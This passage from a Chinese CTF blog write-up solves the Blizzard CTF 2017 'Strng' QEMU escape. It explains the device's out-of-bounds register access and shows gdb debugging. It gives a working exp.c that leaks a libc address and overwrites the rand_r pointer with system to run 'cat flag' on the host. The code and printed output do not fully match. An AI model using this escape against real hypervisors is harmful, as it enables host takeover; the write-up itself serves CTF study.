class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> reg_addr; <span class="comment">// eax</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        reg_addr = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(reg_addr &amp; <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          idx = reg_addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">1</span>] = opaque-&gt;rand(opaque, <span class="number">4L</span>L, val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt; <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v6 )</span><br><span class="line">              opaque-&gt;srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = opaque-&gt;rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>], <span class="number">4L</span>L, val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[idx] = val;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先满足地址大小为四字节，当addr=0时，将val赋值给opaque-&gt;addr，于是可以实现数组越界可读。当addr不为0时，如果opaque-&gt;addr满足四字节对齐，则将其右移两位赋值给regs的索引idx，其余操作与mmio_write大体相同。因此可以实现数组越界可写。</p>
<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol>
<li>将<code>108</code>写入opaque-&gt;addr，泄露出srand高四字节地址，将<code>104</code>写入opaque-&gt;addr，泄露出srand低四字节地址</li>
<li>根据srand的地址算出libc基址以及system的地址</li>
<li>将system地址写进rand_r地址处,将“cat flag”写进regs[2]处</li>
<li>利用mmio_wrtie，addr=12，触发漏洞，获取flag</li>
</ol>
<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>为了方便，我们创建一个gdb脚本debug.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b strng_mmio_read</span><br><span class="line">b strng_mmio_write</span><br><span class="line">b strng_pmio_read</span><br><span class="line">b strng_pmio_write</span><br><span class="line">run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>
<p>gdb调试qemu</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  strng sudo gdb qemu-system-x86_64</span><br><span class="line">[sudo] kangel 的密码： </span><br><span class="line">GNU gdb (GDB) 8.3</span><br><span class="line">Copyright (C) 2019 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">"show copying"</span> and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">pwndbg: loaded 180 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from qemu-system-x86_64...</span><br><span class="line">pwndbg&gt; <span class="built_in">source</span> debug.txt</span><br></pre></td></tr></table></figure>
<p>ssh登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ssh -p 5555 ubuntu@localhost</span><br></pre></td></tr></table></figure>
<p>exp.c主函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x67616c66</span>);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x00000000</span>);</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leaking libc address </span></span><br><span class="line">    <span class="keyword">uint64_t</span> srandom_addr=pmio_arbread(<span class="number">0x108</span>);</span><br><span class="line">    srandom_addr=srandom_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    srandom_addr+=pmio_arbread(<span class="number">0x104</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking srandom addr: 0x%llx\n"</span>,srandom_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base= srandom_addr<span class="number">-0x43bb0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr= libc_base+<span class="number">0x4f440</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc base: 0x%llx\n"</span>,libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system addr: 0x%llx\n"</span>,system_addr);</span><br><span class="line">    <span class="comment">// overwrite rand_r pointer to system</span></span><br><span class="line">    pmio_abwrite(<span class="number">0x114</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0xc</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -m32 -O0 test_mmio.c -o test_mmio</span><br></pre></td></tr></table></figure>
<p>将exp传给guest</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu</span><br></pre></td></tr></table></figure>
<p>执行exp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo ./exp</span><br></pre></td></tr></table></figure>
<p>此时gdb断在了<code>strng_mmio_write</code>处，ida查看此时寄存器的状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004103E0 opaque = rdi                            ; void *</span><br><span class="line">.text:00000000004103E0 addr = rsi                              ; hwaddr</span><br><span class="line">.text:00000000004103E0 val_0 = rdx                             ; uint64_t</span><br><span class="line">.text:00000000004103E0 size = rcx                              ; unsigned int</span><br></pre></td></tr></table></figure>
<p>查看gdb中寄存器的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RBX  0x20746163</span><br><span class="line">RCX  0x4</span><br><span class="line">RDX  0x20746163</span><br><span class="line">RDI  0x5555566f4860 —▸ 0x5555565c52e0 —▸ 0x555556572600 —▸ 0x555556572780 ◂— 0x676e727473 /* u&apos;strng&apos; */</span><br><span class="line">RSI  0x8</span><br></pre></td></tr></table></figure>
<p>通过rdi+0xaf0查看addr、regs等结构体的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx $rdi+0xaf0</span><br><span class="line">0x5555566f5350:	0x0000000000000000	0x2074616300000000</span><br><span class="line">0x5555566f5360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f53a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f53b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f53c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f53d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f53e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f53f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5400:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555566f5450:	0x0000000000000000	0x00007ffff6466bb0  #srand</span><br><span class="line">0x5555566f5460:	0x00007ffff64673a0	0x00007ffff64673b0  #rand、rand_r</span><br><span class="line">0x5555566f5470:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x5555566f5480:	0x0000000000000000	0x00005555577793a0</span><br></pre></td></tr></table></figure>
<p>查看srand、rand、rand_r函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x00007ffff6466bb0</span><br><span class="line">0x7ffff6466bb0 &lt;__srandom&gt;:	0x01befa8908ec8348</span><br><span class="line">pwndbg&gt; x/gx 0x00007ffff64673a0</span><br><span class="line">0x7ffff64673a0 &lt;rand&gt;:	0xfff9f7e808ec8348</span><br><span class="line">pwndbg&gt; x/gx 0x00007ffff64673b0</span><br><span class="line">0x7ffff64673b0 &lt;rand_r&gt;:	0x390541c64e6d0769</span><br></pre></td></tr></table></figure>
<p>利用readelf查看srandom、system函数相对于libc基址的偏移，分别为<code>0x43bb0</code>、<code>0x4f440</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  strng readelf -s /lib/x86_64-linux-gnu/libc-2.27.so|grep -E <span class="string">"srandom|system"</span></span><br><span class="line">   232: 0000000000159e20    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5</span><br><span class="line">   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">   735: 0000000000043e60   290 FUNC    WEAK   DEFAULT   13 srandom_r@@GLIBC_2.2.5</span><br><span class="line">  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5</span><br><span class="line">  1704: 0000000000043bb0   142 FUNC    WEAK   DEFAULT   13 srandom@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
<p>exploit</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ sudo ./exp</span><br><span class="line">mmio_mem @ 0xb77c0000</span><br><span class="line">cat: -: 资源暂时不可用</span><br><span class="line">leaking srandom addr: 0x7f5809579bb0</span><br><span class="line">libc base: 0x7f5809536000</span><br><span class="line">system addr: 0x7f5809585440</span><br><span class="line">leaking heap addr: 0x56130e168ef0</span><br><span class="line">parameter addr: 0x56130e1a2b6c</span><br><span class="line">flag&#123;strng_escape&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.w0lfzhang.com/2018/11/05/Blizzard-CTF-2017-Strng/#more" target="_blank" rel="noopener">https://www.w0lfzhang.com/2018/11/05/Blizzard-CTF-2017-Strng/#more</a></p>
<p><a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html</a></p>
<p><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">kangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章鏈接: </span><span class="post-copyright-info"><a href="https://j-kangel.github.io/2019/11/27/Strng/">https://j-kangel.github.io/2019/11/27/Strng/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版權聲明: </span><span class="post-copyright-info">本博客所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 許可協議。轉載請註明來自 <a href="https://j-kangel.github.io" target="_blank">KANGEL</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn    </a><a class="post-meta__tags" href="/tags/qemu/">qemu    </a><a class="post-meta__tags" href="/tags/escape/">escape    </a></div><div class="post_share"></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/11/29/DefconQuals-2018-EC3/"><img class="prev_cover lazyload" data-src="/article_cover/1175972350.jpeg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>DefconQuals-2018-EC3</span></div></a></div><div class="next-post pull_right"><a href="/2019/09/30/picoctf2019pwn解题记录/"><img class="next_cover lazyload" data-src="/article_cover/1110218886.jpeg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>picoctf2019pwn解题记录</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相關推薦</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2019/11/29/DefconQuals-2018-EC3/" title="DefconQuals-2018-EC3"><img class="relatedPosts_cover lazyload"data-src="/article_cover/1175972350.jpeg"><div class="relatedPosts_title">DefconQuals-2018-EC3</div></a></div><div class="relatedPosts_item"><a href="/2020/06/23/pwnable-tw-Spirited-Away/" title="pwnable.tw Spirited Away"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">pwnable.tw Spirited Away</div></a></div><div class="relatedPosts_item"><a href="/2020/06/22/pwnable-tw-babystack/" title="pwnable.tw babystack"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">pwnable.tw babystack</div></a></div><div class="relatedPosts_item"><a href="/2020/06/09/buuoj刷题记录之堆/" title="buuoj刷题记录之堆"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">buuoj刷题记录之堆</div></a></div><div class="relatedPosts_item"><a href="/2020/06/06/RCTF2020-pwn/" title="RCTF2020 部分pwn"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">RCTF2020 部分pwn</div></a></div><div class="relatedPosts_item"><a href="/2020/04/16/kernel-pwn-one/" title="kernel pwn(one)"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">kernel pwn(one)</div></a></div></div><div class="clear_both"></div></div></div></div><footer id="footer" style="background-image: url(/article_cover/434237378.jpeg)"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2020 By kangel</div><div class="framework-info"><span>Power by </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://j-kangel.github.io/">blog</a>!</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="閲讀模式"></i><i class="fa fa-plus" id="font_plus" title="放大字體"></i><i class="fa fa-minus" id="font_minus" title="縮小字體"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="簡繁轉換" target="_self">简</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜間模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="設置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目錄" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到頂部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.15/dist/snackbar.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script src="/js/tw_cn.js"></script><script>translateInitilization()
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script></body></html>